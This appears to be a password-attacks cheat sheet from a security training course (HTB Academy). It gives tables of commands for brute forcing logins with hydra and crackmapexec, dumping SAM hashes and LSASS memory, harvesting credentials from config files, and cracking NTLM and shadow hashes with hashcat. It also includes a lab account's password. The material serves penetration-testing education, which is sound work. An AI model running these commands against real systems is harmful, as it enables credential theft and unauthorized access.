## Connecting to Target

| Command | Description |
|---------|-------------|
| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |
| `evil-winrm -i <ip> -u user -p password` | Uses Evil-WinRM to establish a Powershell session with a target. |
| `ssh user@<ip>` | Uses SSH to connect to a target using a specified user. |
| `smbclient -U user \\\\<ip>\\SHARENAME` | Uses smbclient to connect to an SMB share using a specified user. |
| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | Uses smbserver.py to create a share on a linux-based attack host. |
  
## Password Mutations

| Command | Description |
|---------|-------------|
| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` | Uses cewl to generate a wordlist based on keywords present on a website. |
| `hashcat --force password.list -r custom.rule --stdout > mut_password.list` | Uses Hashcat to generate a rule-based word list. |
| `./username-anarchy -i /path/to/listoffirstandlastnames.txt` | Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential usernames. |
| `curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt` | Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. |
  
## Remote Password Attacks

| Command | Description |
|---------|-------------|
| `crackmapexec winrm <ip> -u user.list -p password.list` | Uses CrackMapExec over WinRM to attempt to brute force user names and passwords. |
| `crackmapexec smb <ip> -u "user" -p "password" --shares` | Uses CrackMapExec to enumerate smb shares on a target. |
| `hydra -L user.list -P password.list <service>://<ip>` | Uses Hydra to attempt to crack a password over the specified service. |
| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam` | Uses CrackMapExec to dump password hashes stored in SAM, over the network. |

## Windows Local Password Attacks

| Command | Description |
|---------|-------------|
| `tasklist /svc` | Lists running processes. |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` | Searches for the string "password" in different file types. |
| `Get-Process lsass` | Displays process information for LSASS. |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` | Creates an LSASS memory dump file. |
| `pypykatz lsa minidump /path/to/lsassdumpfile` | Extracts credentials from LSASS process memory dump file. |

## Linux Local Password Attacks

| Command | Description |
|---------|-------------|
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done` | Finds `.conf`, `.config`, and `.cnf` files. |
| `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done` | Finds credentials in `.cnf` files. |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"` | Searches for text files. |
| `cat /etc/crontab` | Views crontab contents. |

## Cracking Passwords

| Command | Description |
|---------|-------------|
| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt` | Cracks NTLM hashes using Hashcat. |
| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show` | Attempts to crack a single NTLM hash. |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` | Combines data from passwd.bak and shadow.bk into one file for cracking. |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` | Cracks unshadowed hashes using a wordlist. |

---
